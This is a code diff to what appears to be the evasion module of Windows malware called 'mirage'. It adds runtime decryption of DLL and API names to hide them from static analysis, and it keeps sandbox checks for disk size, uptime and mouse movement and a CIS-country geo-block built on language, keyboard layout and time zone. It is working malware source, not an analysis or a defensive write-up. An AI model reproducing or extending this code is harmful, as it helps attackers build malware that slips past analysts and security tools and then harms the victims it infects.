@@ -5,6 +5,40 @@
  * All Win32 API calls are resolved through PEB walk + hash.
  */
 
+#ifdef TEST_EVASION_STANDALONE
+/* Standalone test mode: expose pure logic functions only */
+#include <windows.h>
+#include "detection.h"
+#include "config.h"
+#include <string.h>
+
+int is_cis_language(uint16_t lang_id) {
+    uint16_t primary = lang_id & 0x3FF;
+    switch (primary) {
+        case 0x19: /* Russian */
+        case 0x22: /* Belarusian */
+        case 0x1C: /* Ukrainian */
+        case 0x2B: /* Azerbaijani */
+        case 0x1F: /* Kazakh */
+        case 0x2C: /* Kyrgyz */
+        case 0x29: /* Tajik */
+        case 0x2E: /* Turkmen */
+        case 0x2F: /* Uzbek */
+        case 0x25: /* Tatar */
+        case 0x28: /* Georgian */
+        case 0x2A: /* Armenian */
+        case 0x42: /* Chechen */
+        case 0x43: /* Chuvash */
+        case 0x37: /* Georgian (Mkhedruli) */
+            return 1;
+        default:
+            return 0;
+    }
+}
+
+#else /* Normal build */
+
+#include <windows.h>
 #include "detection.h"
 #include "evasion.h"
 #include "engine.h"
@@ -12,13 +46,14 @@
 #include "export_resolve.h"
 #include "hash.h"
 #include "config.h"
+#include "enc_strings.h"
 #include <string.h>
 
 #ifdef ENABLE_DETECTION
 
 /* ── CIS language ID check ──────────────────────────────── */
 
-static int is_cis_language(uint16_t lang_id) {
+int is_cis_language(uint16_t lang_id) {
     uint16_t primary = lang_id & 0x3FF;
     switch (primary) {
         case 0x19: /* Russian */
@@ -59,13 +94,15 @@ static void* load_module(const char* name) {
 /* ── checkDiskSize ───────────────────────────────────────── */
 
 int mirage_check_disk_size(void) {
-    void* kernel32 = load_module("kernel32.dll");
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void* kernel32 = load_module(dll);
     if (!kernel32) return -1;
 
     /* GetDiskFreeSpaceExA */
     typedef BOOL (*fn_GetDiskFreeSpaceExA)(const char*, uint64_t*, uint64_t*, uint64_t*);
+    char fn[32]; enc_decrypt(enc_GetDiskFreeSpaceExA, ENC_GETDISKFREESPACEEXA_LEN, fn);
     fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA =
-        (fn_GetDiskFreeSpaceExA)resolve_func(kernel32, "GetDiskFreeSpaceExA");
+        (fn_GetDiskFreeSpaceExA)resolve_func(kernel32, fn);
     if (!pGetDiskFreeSpaceExA) return -1;
 
     uint64_t free_avail = 0;
@@ -81,13 +118,15 @@ int mirage_check_disk_size(void) {
 /* ── checkUptime ─────────────────────────────────────────── */
 
 int mirage_check_uptime(void) {
-    void* kernel32 = load_module("kernel32.dll");
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void* kernel32 = load_module(dll);
     if (!kernel32) return -1;
 
     /* GetTickCount64 */
     typedef uint64_t (*fn_GetTickCount64)(void);
+    char fn[32]; enc_decrypt(enc_GetTickCount64, ENC_GETTICKCOUNT64_LEN, fn);
     fn_GetTickCount64 pGetTickCount64 =
-        (fn_GetTickCount64)resolve_func(kernel32, "GetTickCount64");
+        (fn_GetTickCount64)resolve_func(kernel32, fn);
     if (!pGetTickCount64) return -1;
 
     uint64_t ms = pGetTickCount64();
@@ -97,15 +136,17 @@ int mirage_check_uptime(void) {
 /* ── checkMouseMovement ──────────────────────────────────── */
 
 int mirage_check_mouse_movement(void) {
-    void* user32 = load_module("user32.dll");
+    char dll[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
+    void* user32 = load_module(dll);
     if (!user32) return -1;
 
     typedef struct { long x; long y; } POINT;
 
     /* GetCursorPos */
     typedef BOOL (*fn_GetCursorPos)(POINT*);
+    char fn[32]; enc_decrypt(enc_GetCursorPos, ENC_GETCURSORPOS_LEN, fn);
     fn_GetCursorPos pGetCursorPos =
-        (fn_GetCursorPos)resolve_func(user32, "GetCursorPos");
+        (fn_GetCursorPos)resolve_func(user32, fn);
     if (!pGetCursorPos) return -1;
 
     POINT p1;
@@ -128,12 +169,14 @@ mirage_geo_result mirage_check_geo_block(void) {
     mirage_geo_result result;
     memset(&result, 0, sizeof(result));
 
-    void* user32 = load_module("user32.dll");
+    char dll[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
+    void* user32 = load_module(dll);
     if (user32) {
         /* GetKeyboardLayoutList */
         typedef int (*fn_GetKeyboardLayoutList)(int, unsigned long*);
+        char fn[32]; enc_decrypt(enc_GetKeyboardLayoutList, ENC_GETKEYBOARDLAYOUTLIST_LEN, fn);
         fn_GetKeyboardLayoutList pGetKeyboardLayoutList =
-            (fn_GetKeyboardLayoutList)resolve_func(user32, "GetKeyboardLayoutList");
+            (fn_GetKeyboardLayoutList)resolve_func(user32, fn);
         if (pGetKeyboardLayoutList) {
             unsigned long layouts[32];
             int count = pGetKeyboardLayoutList(32, layouts);
@@ -149,15 +192,17 @@ mirage_geo_result mirage_check_geo_block(void) {
 
         /* GetSystemDefaultLangID */
         typedef uint16_t (*fn_GetSystemDefaultLangID)(void);
+        enc_decrypt(enc_GetSystemDefaultLangID, ENC_GETSYSTEMDEFAULTLANGID_LEN, fn);
         fn_GetSystemDefaultLangID pGetLang =
-            (fn_GetSystemDefaultLangID)resolve_func(user32, "GetSystemDefaultLangID");
+            (fn_GetSystemDefaultLangID)resolve_func(user32, fn);
         if (pGetLang) {
             if (is_cis_language(pGetLang()))
                 result.cis_locale = 1;
         }
     }
 
-    void* kernel32 = load_module("kernel32.dll");
+    char dll2[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll2);
+    void* kernel32 = load_module(dll2);
     if (kernel32) {
         /* GetTimeZoneInformation */
         typedef struct {
@@ -167,8 +212,9 @@ mirage_geo_result mirage_check_geo_block(void) {
         } TIME_ZONE_INFORMATION_LITE;
 
         typedef int (*fn_GetTimeZoneInformation)(TIME_ZONE_INFORMATION_LITE*);
+        char fn2[32]; enc_decrypt(enc_GetTimeZoneInformation, ENC_GETTIMEZONEINFORMATION_LEN, fn2);
         fn_GetTimeZoneInformation pGetTzi =
-            (fn_GetTimeZoneInformation)resolve_func(kernel32, "GetTimeZoneInformation");
+            (fn_GetTimeZoneInformation)resolve_func(kernel32, fn2);
         if (pGetTzi) {
             TIME_ZONE_INFORMATION_LITE tzi;
             memset(&tzi, 0, sizeof(tzi));
@@ -186,3 +232,4 @@ mirage_geo_result mirage_check_geo_block(void) {
 }
 
 #endif /* ENABLE_DETECTION */
+#endif /* TEST_EVASION_STANDALONE */
